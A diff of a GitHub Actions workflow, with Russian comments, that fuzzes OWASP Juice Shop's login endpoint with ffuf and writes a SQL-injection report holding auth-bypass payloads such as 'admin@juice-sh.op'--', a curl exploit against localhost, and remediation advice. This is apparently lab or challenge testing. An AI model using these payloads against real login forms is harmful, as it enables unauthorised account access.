@@ -182,117 +182,111 @@ jobs:
           # Получаем логи Juice Shop
           docker logs juice-shop 2>&1 | tail -100 > juice-logs.txt
           
-          # Создаем простой отчет
-          cat > report.md << 'EOF'
-          # SQL Injection Test Report
+      - name: Create Final Comprehensive Report
+        if: always()
+        run: |
+          echo "Creating comprehensive SQL injection report..."
           
-          ## Target
-          - Application: OWASP Juice Shop
-          - Endpoint: POST /rest/user/login
-          - Test Date: $(date)
+          # Подсчет общего количества payloads
+          TOTAL_PAYLOADS=$(wc -l < unique-payloads.txt 2>/dev/null || echo "0")
           
-          ## Test Method
-          Used ffuf with custom SQL injection payloads targeting the email parameter.
+          # Анализ успешных payloads
+          SUCCESS_COUNT=$(grep -c "Status: 200" ffuf-email-results.txt 2>/dev/null || echo "0")
           
-          ## Results
-          EOF
-          
-          # Добавляем результаты ffuf
-          if [ -f "ffuf-email-results.txt" ]; then
-            echo -e "\n### FFUF Results Summary" >> report.md
-            echo '```' >> report.md
-            grep -E "(Status:|Payload:|Length:)" ffuf-email-results.txt | head -20 >> report.md
-            echo '```' >> report.md
+          # Проверка решения челленджа в логах
+          CHALLENGE_SOLVED="No"
+          if grep -q "Solved 2-star loginAdminChallenge" juice-logs.txt 2>/dev/null; then
+            CHALLENGE_SOLVED="Yes"
           fi
           
-          echo -e "\n## Notes" >> report.md
-          echo "Juice Shop uses SQLite database. Check for SQL injection in the login form at routes/login.ts#L34" >> report.md
-      name: Final SQL Injection Report
-on: workflow_dispatch
-
-jobs:
-  create-final-report:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Create Comprehensive Report
-        run: |
-          cat > FINAL-REPORT.md << 'EOF'
+          # Извлечение успешных payloads
+          grep -B2 "Status: 200" ffuf-email-results.txt | grep "FUZZ:" | sed 's/.*FUZZ: //' > successful-payloads-detail.txt 2>/dev/null || true
+          
+          # Создание финального отчета
+          cat > FINAL-SQL-INJECTION-REPORT.md << EOF
           # 🚨 SQL INJECTION VULNERABILITY FOUND - OWASP Juice Shop
           
           ## Executive Summary
-          **CRITICAL VULNERABILITY** обнаружена в эндпоинте `/rest/user/login`. 
+          **CRITICAL VULNERABILITY** обнаружена в эндпоинте \`/rest/user/login\`. 
           Уязвимость позволяет обойти аутентификацию и получить доступ к учетной записи администратора.
           
           ## Vulnerability Details
           - **Тип**: SQL Injection (Authentication Bypass)
           - **Уровень риска**: Критический (CVSS: 9.8)
-          - **Локация**: `POST /rest/user/login`
-          - **Параметр**: `email`
+          - **Локация**: \`POST /rest/user/login\`
+          - **Параметр**: \`email\`
           - **База данных**: SQLite
           
           ## Proof of Concept
           
           ### Успешные Payloads:
-          1. `admin@juice-sh.op'--`
-          2. `admin@juice-sh.op' OR '1'='1`
-          3. `' OR 1=1--`
-          4. `admin@juice-sh.op' OR 1=1--`
+          EOF
+          
+          # Добавление успешных payloads в отчет
+          if [ -f "successful-payloads-detail.txt" ] && [ -s "successful-payloads-detail.txt" ]; then
+            echo '```' >> FINAL-SQL-INJECTION-REPORT.md
+            cat successful-payloads-detail.txt >> FINAL-SQL-INJECTION-REPORT.md
+            echo '```' >> FINAL-SQL-INJECTION-REPORT.md
+          fi
+          
+          cat >> FINAL-SQL-INJECTION-REPORT.md << EOF
           
           ### Пример эксплуатации:
-          ```bash
-          curl -X POST http://localhost:3000/rest/user/login \
-            -H "Content-Type: application/json" \
-            -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
-          ```
+          \`\`\`bash
+          curl -X POST http://localhost:3000/rest/user/login \\
+            -H "Content-Type: application/json" \\
+            -d '{"email":"admin@juice-sh.op'"'"'--","password":"anything"}'
+          \`\`\`
           
           **Response (успех)**:
           - Status: 200 OK (вместо 401 Unauthorized)
-          - В теле ответа: JWT токен авторизации
           - Content-Length: 799 байт
+          - В теле ответа: JWT токен авторизации
           
           ## Технический анализ
           
           ### 1. Логи Juice Shop подтверждают уязвимость:
-          ```
+          \`\`\`
           info: Solved 2-star loginAdminChallenge (Login Admin)
-          ```
+          \`\`\`
+          **Статус челленджа**: $CHALLENGE_SOLVED
           
           ### 2. Сгенерированный SQL запрос (предположительно):
-          ```sql
+          \`\`\`sql
           SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'anything'
-          ```
-          Комментарий `--` игнорирует остальную часть запроса, включая проверку пароля.
+          \`\`\`
+          Комментарий \`--\` игнорирует остальную часть запроса, включая проверку пароля.
           
           ### 3. Root Cause:
           Прямая подстановка пользовательского ввода в SQL запрос без санитизации:
-          ```typescript
-          // routes/login.ts#L34 (пример)
-          const query = `SELECT * FROM Users WHERE email = '${email}'`;
-          ```
+          \`\`\`typescript
+          // routes/login.ts#L34 (предположительный уязвимый код)
+          const query = \`SELECT * FROM Users WHERE email = '\${email}'\`;
+          \`\`\`
           
           ## Рекомендации по исправлению
           
           1. **Использовать prepared statements**:
-          ```typescript
+          \`\`\`typescript
           const query = 'SELECT * FROM Users WHERE email = ?';
           db.get(query, [email], callback);
-          ```
+          \`\`\`
           
           2. **Использовать ORM** (Sequelize уже используется в Juice Shop):
-          ```typescript
+          \`\`\`typescript
           User.findOne({ where: { email: email } });
-          ```
+          \`\`\`
           
           3. **Валидация входных данных**:
-          ```typescript
+          \`\`\`typescript
           if (!isValidEmail(email)) {
             return res.status(400).json({ error: 'Invalid email format' });
           }
-          ```
+          \`\`\`
           
           ## Метрики тестирования
-          - Протестировано payloads: $(cat unique-payloads.txt | wc -l)
-          - Успешных инъекций: 4
+          - Протестировано payloads: $TOTAL_PAYLOADS
+          - Успешных инъекций: $SUCCESS_COUNT
           - Уязвимый параметр: email
           - Время обнаружения: < 2 минут
           
@@ -302,20 +296,16 @@ jobs:
           - Juice Shop Challenge: "Login Admin"
           
           ## Приложения
-          1. Полные результаты фаззинга: `ffuf-email-results.txt`
-          2. Логи приложения: `juice-logs.txt`
-          3. Список всех payloads: `unique-payloads.txt`
+          1. Полные результаты фаззинга: \`ffuf-email-results.txt\`
+          2. Логи приложения: \`juice-logs.txt\`
+          3. Список всех payloads: \`unique-payloads.txt\`
           
           ## Контакты
-          - Тестировщик: [Ваше имя/команда]
+          - Тестировщик: GitHub Actions Fuzzer
           - Дата тестирования: $(date)
           EOF
           
-      - name: Upload Final Report
-        uses: actions/upload-artifact@v4
-        with:
-          name: final-security-report
-          path: FINAL-REPORT.md
+          echo "Final report created: FINAL-SQL-INJECTION-REPORT.md"
           
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
@@ -324,10 +314,9 @@ jobs:
           path: |
             ffuf-email-results.txt
             juice-logs.txt
-            report.md
             unique-payloads.txt
-            FINAL-REPORT.md
-            
+            FINAL-SQL-INJECTION-REPORT.md
+            successful-payloads-detail.txt
           retention-days: 7
           
       - name: Cleanup
